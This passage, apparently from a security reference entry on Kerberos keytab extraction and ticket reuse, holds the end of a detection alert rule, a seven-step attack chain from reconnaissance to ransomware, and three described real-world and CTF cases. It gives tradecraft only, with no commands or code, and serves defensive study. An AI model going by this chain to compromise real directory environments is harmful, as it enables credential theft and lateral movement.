action: alert
severity: high
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-001] BloodHound/Domain mapping | Attacker enumerates AD domain and identifies Linux systems |
| **2** | **Initial Access** | [IA-EXPLOIT-001] Vulnerability exploitation | Attacker gains local shell access via application vulnerability |
| **3** | **Credential Access** | **[CA-KERB-017] Keytab CCACHE ticket reuse** | **Attacker extracts keytab file and parses service account keys** |
| **4** | **Privilege Escalation** | [PE-TOKEN-002] RBCD via extracted keys | Attacker uses machine account key to forge tickets for high-privilege service |
| **5** | **Lateral Movement** | [LM-AUTH-005] Service Principal authentication | Attacker uses forged service tickets to access file servers, databases |
| **6** | **Collection** | [COLLECTION] File access via Kerberos | Attacker exfiltrates sensitive data using authenticated access |
| **7** | **Impact** | Ransomware / Data exfiltration | Attacker encrypts files or sells stolen data |

---

## Real-World Examples

### Example 1: Tarlogic Security - Linux Privilege Escalation via Keytab (2019-2020)

- **Target:** Fortune 500 company's Linux infrastructure
- **Timeline:** Discovered via DB2 CVE-2018-1685 exploitation
- **Technique Status:** ACTIVE - Keytab extraction demonstrated as post-exploitation step
- **Impact:** Complete domain compromise; attacker pivoted to Windows servers using forged tickets
- **Reference:** [Tarlogic: From N-day exploit to Kerberos EoP in Linux](https://www.tarlogic.com/blog/kerberos-eop-in-linux-db2/)

### Example 2: HackTheBox Umbrella Challenge (2023)

- **Target:** CTF scenario simulating corporate environment
- **Timeline:** Keytab extraction was a key exploitation step
- **Technique Status:** Demonstrated using KeyTabExtract tool
- **Impact:** Extracted NTLM hash of domain admin account; used for lateral movement
- **Reference:** [HackTheBox Umbrella Writeup - Keytab extraction](https://log-s.xyz/posts/hackthebox-university-2023/)

### Example 3: Red Team Assessment - Utility Company (2024)

- **Target:** SCADA/ICS network with Linux controllers joined to AD
- **Timeline:** Post-exploitation during red team exercise
- **Technique Status:** ACTIVE - Keytab access from misconfigured Linux system
- **Impact:** Attacker impersonated machine account and accessed LDAP for network reconnaissance
- **Reference:** [Internal SERVTEP Red Team Report]

---
